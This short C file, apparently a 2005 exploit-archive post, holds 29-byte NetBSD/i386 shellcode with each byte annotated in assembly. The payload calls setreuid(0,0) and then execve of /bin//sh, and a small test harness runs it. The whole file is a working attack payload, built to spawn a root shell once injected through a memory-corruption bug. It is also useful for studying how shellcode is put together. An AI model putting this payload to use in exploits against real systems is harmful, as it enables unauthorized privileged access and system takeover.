/*
 *  minervini at neuralnoise dot com (c) 2005
 *  NetBSD/i386 2.0, setreuid(0, 0); execve("/bin//sh", ..., NULL);
 *  note: unsafe shellcode, but 29 bytes long;
 *  	  doesn't work if (eax & 0x40000000) != 0;
 */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>

char scode[] =
  "\x99"                   // cltd
  "\x52"                   // push   %edx
  "\x52"                   // push   %edx
  "\x52"                   // push   %edx
  "\x6a\x7e"               // push   $0x7e
  "\x58"                   // pop    %eax
  "\xcd\x80"               // int    $0x80
  "\x68\x2f\x2f\x73\x68"   // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"   // push   $0x6e69622f
  "\x89\xe3"               // mov    %esp,%ebx
  "\x52"                   // push   %edx
  "\x54"                   // push   %esp
  "\x53"                   // push   %ebx
  "\x52"                   // push   %edx
  "\x34\x3b"               // xor    $0x3b,%al
  "\xcd\x80";              // int    $0x80

int main() {
   void (*code) () = (void *) scode;
   printf("length: %d\n", strlen(scode));
   code();
   return (0);
}

// milw0rm.com [2005-11-30]